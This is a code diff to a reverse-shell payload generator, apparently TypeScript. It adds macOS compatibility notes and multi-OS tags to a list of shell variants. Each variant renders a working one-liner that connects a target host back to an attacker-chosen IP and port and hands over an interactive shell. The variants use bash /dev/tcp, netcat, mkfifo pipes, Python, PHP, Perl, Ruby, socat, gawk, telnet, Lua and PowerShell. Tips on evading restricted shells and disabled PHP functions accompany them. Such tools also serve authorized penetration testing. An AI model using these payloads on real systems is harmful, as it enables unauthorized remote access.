@@ -16,7 +16,11 @@ export interface ShellVariant {
   id: ShellId;
   label: string;
   group: string;
-  os: OsFamily;
+  /** One or more OS families this payload is verified to work on. Payloads that work on both
+   *  Linux and macOS list both rather than using a separate "cross-platform" bucket — but only
+   *  when actually verified per-payload; e.g. bash's /dev/tcp trick is Linux-only because macOS's
+   *  bundled bash 3.2 isn't built with --enable-net-redirections. */
+  os: OsFamily[];
   /** Whether the shell-path input applies to this variant. Several payloads hardcode /bin/sh
    *  internally (confirmed during syntax verification) rather than taking a configurable path. */
   usesShellPath: boolean;
@@ -45,9 +49,9 @@ export const SHELLS: ShellVariant[] = [
     id: "bash-dev-tcp",
     label: "Bash -i (/dev/tcp)",
     group: "Bash",
-    os: "linux",
+    os: ["linux"],
     usesShellPath: true,
-    note: "Needs a bash build with --enable-net-redirections (default on most distros) — won't work under dash/sh.",
+    note: "Needs a bash build with --enable-net-redirections (default on most distros) — won't work under dash/sh. macOS's bundled /bin/bash (3.2) isn't built with this flag, so this doesn't work out of the box on Mac.",
     render: (p) => `${p.shellPath} -i >& /dev/tcp/${p.ip}/${p.port} 0>&1`,
     file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
   },
@@ -55,9 +59,9 @@ export const SHELLS: ShellVariant[] = [
     id: "bash-dev-tcp-wrapped",
     label: "Bash -i (/dev/tcp, restricted-shell wrapper)",
     group: "Bash",
-    os: "linux",
+    os: ["linux"],
     usesShellPath: true,
-    note: "Wraps the /dev/tcp trick in `bash -c` — useful when the current shell itself is restricted.",
+    note: "Wraps the /dev/tcp trick in `bash -c` — useful when the current shell itself is restricted. Same macOS caveat as the plain /dev/tcp variant: stock /bin/bash on Mac lacks net redirection support.",
     render: (p) => `bash -c '${p.shellPath} -i >& /dev/tcp/${p.ip}/${p.port} 0>&1'`,
     file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
   },
@@ -65,9 +69,9 @@ export const SHELLS: ShellVariant[] = [
     id: "nc-e",
     label: "Netcat -e (traditional/GNU)",
     group: "Netcat",
-    os: "linux",
+    os: ["linux"],
     usesShellPath: true,
-    note: "OpenBSD nc — the default on modern Debian/Ubuntu/Kali — does NOT support -e. Needs netcat-traditional or GNU netcat.",
+    note: "OpenBSD nc — the default on modern Debian/Ubuntu/Kali — does NOT support -e. Needs netcat-traditional or GNU netcat. macOS's bundled nc is also built without -e support, so this requires installing GNU netcat there too.",
     render: (p) => `nc -e ${p.shellPath} ${p.ip} ${p.port}`,
     file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
   },
@@ -75,9 +79,9 @@ export const SHELLS: ShellVariant[] = [
     id: "nc-mkfifo",
     label: "Netcat (mkfifo, no -e needed)",
     group: "Netcat",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: true,
-    note: "Works with any nc build, including OpenBSD nc.",
+    note: "Works with any nc build, including OpenBSD nc and macOS's bundled BSD nc.",
     render: (p) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|${p.shellPath} -i 2>&1|nc ${p.ip} ${p.port} >/tmp/f`,
     file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
   },
@@ -85,9 +89,9 @@ export const SHELLS: ShellVariant[] = [
     id: "ncat-exec",
     label: "Ncat --exec",
     group: "Netcat",
-    os: "cross",
+    os: ["linux", "mac"],
     usesShellPath: true,
-    note: "Nmap's ncat always supports exec, unlike OpenBSD nc.",
+    note: "Nmap's ncat always supports exec, unlike OpenBSD nc — but it isn't preinstalled on Linux or Mac, so the target needs Nmap (or standalone Ncat) installed first.",
     render: (p) => `ncat ${p.ip} ${p.port} -e ${p.shellPath}`,
     file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
   },
@@ -95,9 +99,9 @@ export const SHELLS: ShellVariant[] = [
     id: "python",
     label: "Python (python)",
     group: "Python",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: false,
-    note: "The `python` binary may not exist on modern systems — use the python3 variant if this fails.",
+    note: "The `python` binary may not exist on modern systems (removed from most current Linux distros and from macOS since Catalina) — use the python3 variant if this fails.",
     render: (p) =>
       `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${p.ip}",${p.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
     file: {
@@ -111,8 +115,9 @@ export const SHELLS: ShellVariant[] = [
     id: "python3",
     label: "Python (python3)",
     group: "Python",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: false,
+    note: "macOS doesn't ship python3 out of the box on recent releases — first invocation typically triggers an Xcode Command Line Tools install prompt.",
     render: (p) =>
       `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${p.ip}",${p.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
     file: {
@@ -126,7 +131,7 @@ export const SHELLS: ShellVariant[] = [
     id: "php-exec",
     label: "PHP (exec/fsockopen)",
     group: "PHP",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: false,
     note: "Fails if exec() is in disable_functions (common on shared hosting) — try the proc_open variant instead.",
     render: (p) => `php -r '$sock=fsockopen("${p.ip}",${p.port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
@@ -140,7 +145,7 @@ export const SHELLS: ShellVariant[] = [
     id: "php-proc-open",
     label: "PHP (proc_open fallback)",
     group: "PHP",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: false,
     note: "Use when exec()/shell_exec() are disabled but proc_open() isn't.",
     render: (p) =>
@@ -156,8 +161,9 @@ export const SHELLS: ShellVariant[] = [
     id: "perl",
     label: "Perl",
     group: "Perl",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: false,
+    note: "macOS still ships /usr/bin/perl (with a deprecation warning on recent releases) — works but Apple may drop it in a future major version.",
     render: (p) =>
       `perl -e 'use Socket;$i="${p.ip}";$p=${p.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
     file: {
@@ -171,8 +177,9 @@ export const SHELLS: ShellVariant[] = [
     id: "ruby",
     label: "Ruby",
     group: "Ruby",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: false,
+    note: "macOS still ships a system ruby (deprecated since Monterey, but present) — works but expect a deprecation warning on stderr.",
     render: (p) => `ruby -rsocket -e'f=TCPSocket.open("${p.ip}",${p.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
     file: {
       extension: "rb",
@@ -185,9 +192,9 @@ export const SHELLS: ShellVariant[] = [
     id: "socat",
     label: "Socat",
     group: "Socat",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: true,
-    note: "Requires the socat binary on the target — not installed by default on most distros. Pairs with a socat listener, not plain nc.",
+    note: "Requires the socat binary on the target — not installed by default on most distros or on macOS (needs `brew install socat`). Pairs with a socat listener, not plain nc.",
     render: (p) => `socat exec:'${p.shellPath} -li',pty,stderr,setsid,sigint,sane tcp:${p.ip}:${p.port}`,
     listener: (p) => `socat file:\`tty\`,raw,echo=0 tcp-listen:${p.port}`,
     file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
@@ -196,9 +203,9 @@ export const SHELLS: ShellVariant[] = [
     id: "awk",
     label: "Awk (gawk only)",
     group: "Awk",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: false,
-    note: "Requires gawk specifically — the /inet/tcp special file is a gawk extension. Silently fails on mawk/BusyBox awk.",
+    note: "Requires gawk specifically — the /inet/tcp special file is a gawk extension. Silently fails on mawk/BusyBox awk, and also on macOS's default BSD awk (needs `brew install gawk`, then run as gawk).",
     render: (p) =>
       `awk 'BEGIN {s = "/inet/tcp/0/${p.ip}/${p.port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
     file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
@@ -207,9 +214,9 @@ export const SHELLS: ShellVariant[] = [
     id: "telnet",
     label: "Telnet (mkfifo)",
     group: "Telnet",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: false,
-    note: "Telnet has no native fd redirection, so this relies on the same mkfifo trick as the netcat variant.",
+    note: "Telnet has no native fd redirection, so this relies on the same mkfifo trick as the netcat variant. Most modern Linux distros and macOS (since Sierra) no longer ship a telnet client by default — install one first.",
     render: (p) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet ${p.ip} ${p.port} >/tmp/f`,
     file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
   },
@@ -217,7 +224,7 @@ export const SHELLS: ShellVariant[] = [
     id: "nodejs",
     label: "Node.js",
     group: "Node.js",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: false,
     note: "Requires node on the target — uncommon outside dev boxes or Node-based app containers. Spawns /bin/sh, so this targets Unix hosts only, not Windows.",
     render: (p) =>
@@ -233,9 +240,9 @@ export const SHELLS: ShellVariant[] = [
     id: "lua",
     label: "Lua",
     group: "Lua",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: false,
-    note: "Requires the luasocket library — not part of stock Lua and frequently absent even when the lua binary exists.",
+    note: "Requires the luasocket library — not part of stock Lua and frequently absent even when the lua binary exists. Lua itself isn't preinstalled on macOS either (needs `brew install lua luarocks` + luasocket).",
     render: (p) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${p.ip}','${p.port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
     file: {
       extension: "lua",
@@ -248,7 +255,7 @@ export const SHELLS: ShellVariant[] = [
     id: "golang",
     label: "Golang (go run)",
     group: "Golang",
-    os: "linux",
+    os: ["linux", "mac"],
     usesShellPath: false,
     note: "Needs the full Go toolchain installed on the target, not just a compiled binary — uncommon outside dev/CI hosts. Runs /bin/sh, so this targets Unix hosts only, not Windows.",
     render: (p) =>
@@ -264,7 +271,7 @@ export const SHELLS: ShellVariant[] = [
     id: "powershell",
     label: "PowerShell TCP client",
     group: "PowerShell",
-    os: "windows",
+    os: ["windows"],
     usesShellPath: false,
     render: (p) => `powershell -nop -c "${powershellScript(p)}"`,
     renderEncoded: (p) => {
